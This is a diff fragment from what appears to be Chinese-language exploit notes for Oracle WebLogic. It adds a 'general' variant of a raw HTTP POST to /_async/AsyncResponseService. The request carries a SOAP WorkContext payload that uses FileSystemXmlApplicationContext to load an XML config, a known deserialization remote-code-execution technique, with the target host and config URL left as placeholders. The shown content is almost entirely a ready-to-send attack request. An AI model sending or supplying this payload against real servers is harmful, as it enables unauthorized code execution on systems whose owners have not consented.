@@ -73,3 +73,17 @@ content-type: text/xml
 <asy:onAsyncDelivery/>
 </soapenv:Body></soapenv:Envelope>
 ```
+3、通用</br>
+```
+POST /_async/AsyncResponseService HTTP/1.1
+Host: xxx.xxx.xxx.xxx:7001
+Content-Length: 677
+Accept-Encoding: gzip, deflate
+SOAPAction: 
+Accept: */*
+User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
+Connection: keep-alive
+content-type: text/xml
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>xx</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>
+```
